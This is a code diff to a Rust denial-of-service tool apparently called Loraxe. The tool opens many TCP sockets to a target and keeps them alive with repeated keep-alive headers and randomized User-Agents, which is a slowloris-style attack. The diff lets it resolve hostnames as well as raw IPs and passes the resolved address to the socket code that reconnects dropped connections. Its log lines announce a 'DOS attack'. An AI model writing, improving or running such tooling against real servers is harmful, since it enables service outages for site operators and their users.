@@ -5,7 +5,7 @@ use std::error::Error;
 use rayon::prelude::*;
 use std::time::Duration;
 // use openssl::ssl::{SslStream, SslMethod, SslConnector};
-use std::net::{TcpStream, IpAddr, SocketAddr};
+use std::net::{TcpStream, SocketAddr, ToSocketAddrs};
 use std::{thread, time};
 use std::io::{Read, Write};
 use rand::prelude::*;
@@ -94,12 +94,21 @@ impl Loraxe<TcpStream> {
     /// Creates the inital sockets of the attack
     pub fn create_sockets(&mut self) -> Result<(), Box<dyn Error>> {
         info!("Creating Initial {} Sockets", self.config.socket_count);
+
+        let mut url = self.config.addr.clone();
+        url.push_str(":");
+        url.push_str(&self.config.port.to_string());
+
+        let sock_addr: SocketAddr = url.to_socket_addrs()?.collect::<Vec<SocketAddr>>()[0];
+
+        println!("{:?}", sock_addr);
+
         // Create inital scokets
         let sockets = (0..self.config.socket_count).into_par_iter().map(|i| {
 
             debug!("Creating Socket #{}", i);
             // Create socket
-            let sock = init_socket(&self.config);
+            let sock = init_socket(&self.config, &sock_addr);
 
             if sock.is_err(){
                 trace!("Socket #{} Failed to connect",i);
@@ -122,7 +131,6 @@ impl Loraxe<TcpStream> {
     }
 
     pub fn attack(&mut self) -> Result<(), Box<dyn Error>> {
-        info!("Starting {:?} DOS attack on {:?} with {} sockets", self.config.dos_type, self.config.addr, self.config.socket_count);
 
         if self.config.rand_ua {
             info!("Using random User-Agents...")
@@ -131,6 +139,14 @@ impl Loraxe<TcpStream> {
         let mut rng = rand::thread_rng();
 
         let delay = time::Duration::from_secs(self.config.delay);
+
+        let mut url = self.config.addr.clone();
+        url.push_str(":");
+        url.push_str(&self.config.port.to_string());
+
+        let sock_addr: SocketAddr = url.to_socket_addrs()?.collect::<Vec<SocketAddr>>()[0];
+
+        info!("Starting {:?} DOS attack on {:?} with {} sockets", self.config.dos_type, url, self.config.socket_count);
 
         loop {
             info!("Sending keep-alive headers... Socket Count: {}", self.connections.len());
@@ -201,7 +217,7 @@ impl Loraxe<TcpStream> {
                     trace!("Recreating Socket...");
 
                     // Create socket
-                    let sock = init_socket(&self.config);
+                    let sock = init_socket(&self.config, &sock_addr);
 
                     if sock.is_err(){
                         trace!("Socket #{} Failed to connect",i);
@@ -231,9 +247,10 @@ impl Loraxe<TcpStream> {
         }
     }
 
-    pub fn init_socket(config: &Config) -> Result<TcpStream, Box<dyn Error>>{
+    pub fn init_socket(config: &Config, url: &SocketAddr) -> Result<TcpStream, Box<dyn Error>>{
+
         // Create stream as normal
-        let mut stream = TcpStream::connect_timeout(&SocketAddr::from((config.addr[..].parse::<IpAddr>().unwrap(), config.port)), config.sock_timeout)?;
+        let mut stream = TcpStream::connect_timeout(url, config.sock_timeout)?;
 
         let mut rng = rand::thread_rng();
 
